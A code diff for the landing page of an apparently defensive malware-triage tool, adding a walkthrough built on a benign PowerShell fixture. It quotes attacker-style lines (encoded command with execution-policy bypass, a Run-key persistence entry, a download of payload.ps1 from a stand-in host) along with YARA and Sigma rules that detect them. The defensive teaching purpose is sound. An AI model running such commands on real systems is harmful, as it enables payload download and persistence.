@@ -126,18 +126,50 @@ export default function Page() {
           <div className="walkthrough-copy">
             <div className="section-kicker">Walkthrough</div>
             <h2>Static Malware Triage Walkthrough</h2>
-            <p>The safe sample <code>invoice_update.exe</code> demonstrates how an analyst reviews strings, suspicious APIs, IOCs, entropy, MITRE ATT&CK behavior, and final reporting. It uses placeholder training content only, with no live infrastructure or sensitive identifiers.</p>
+            <p>The verified sample <code>sample2.ps1</code> is a benign PowerShell text fixture from the analyzer accuracy audit. It demonstrates real IOC extraction, Base64 decoding, MITRE ATT&CK mapping, and draft detection output generated from the sample content.</p>
+            <div className="walk-output-grid">
+              <div className="walk-output-card">
+                <h3>Input excerpt</h3>
+                <pre className="walk-code">powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkA...
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Invoke-WebRequest -Uri "http://example-malicious-test.com/payload.ps1"</pre>
+              </div>
+              <div className="walk-output-card">
+                <h3>Real analyzer output</h3>
+                <ul className="walk-list">
+                  <li>IOC URL: <code>http://example-malicious-test.com/payload.ps1</code></li>
+                  <li>Registry IOC: <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+                  <li>Decoded payload: <code>Write-Output "AuditSample2"; whoami /all</code></li>
+                  <li>MITRE: <code>T1059.001</code>, <code>T1105</code>, <code>T1547.001</code></li>
+                </ul>
+              </div>
+              <div className="walk-output-card">
+                <h3>YARA excerpt</h3>
+                <pre className="walk-code">$s6 = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
+$s8 = "http://example-malicious-test.com/payload.ps1" nocase
+condition: 3 of them</pre>
+              </div>
+              <div className="walk-output-card">
+                <h3>Sigma excerpt</h3>
+                <pre className="walk-code">CommandLine|contains:
+  - "powershell"
+  - "-enc"
+  - "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</pre>
+              </div>
+            </div>
+            <p>See <a href="/analyzer">the analyzer</a> for the full browser-only workflow, or review <code>docs/analyzer-accuracy-audit.md</code> for the complete generated output dump.</p>
           </div>
           <div className="walkthrough-art" aria-hidden="true">
-            <div className="walk-row"><span>sample</span><strong>invoice_update.exe</strong></div>
-            <div className="walk-row"><span>mode</span><strong>static triage</strong></div>
-            <div className="walk-row"><span>output</span><strong>analyst report</strong></div>
+            <div className="walk-row"><span>sample</span><strong>sample2.ps1</strong></div>
+            <div className="walk-row"><span>decode</span><strong>PowerShell Base64</strong></div>
+            <div className="walk-row"><span>ioc</span><strong>URL + Registry</strong></div>
+            <div className="walk-row"><span>mitre</span><strong>T1059.001 / T1105</strong></div>
           </div>
         </section>
 
         <section className="landing-section">
           <div className="section-kicker">Output Preview</div>
-          <h2>Visual proof placeholders</h2>
+          <h2>Verified analyzer outputs</h2>
           <div className="proof-grid">
             <div className="proof-card"><div className="proof-bar"></div><h3>Analyzer Overview</h3><p>Score, verdict, static metadata, and workflow summary.</p></div>
             <div className="proof-card"><div className="proof-bar"></div><h3>IOC Extraction</h3><p>Structured indicators with actionability and hunt context.</p></div>
